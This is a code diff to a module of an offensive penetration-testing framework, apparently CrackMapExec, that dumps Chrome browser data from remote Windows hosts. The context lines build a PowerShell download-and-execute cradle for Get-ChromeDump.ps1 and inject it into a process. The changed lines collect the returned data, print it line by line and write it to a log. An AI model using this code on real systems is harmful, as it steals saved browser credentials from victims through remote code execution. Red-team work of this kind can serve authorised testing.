@@ -26,7 +26,6 @@ class CMEModule:
 
         command = 'Get-ChromeDump | Out-String'
         chrome_cmd = gen_ps_iex_cradle(context, 'Get-ChromeDump.ps1', command)
-                                       #second_cmd='try { Remove-Item "$($env:LOCALAPPDATA)\System.Data.SQLite.dll"} catch {}')
 
         launcher = gen_ps_inject(chrome_cmd, context)
         ps_command = create_ps_command(launcher)
@@ -61,7 +60,9 @@ class CMEModule:
         response.stop_tracking_host()
 
         if len(data):
-            context.log.highlight(data)
+            buf = StringIO(data).readlines()
+            for line in buf:
+                context.log.highlight(line)
 
             log_name = 'ChromeDump-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
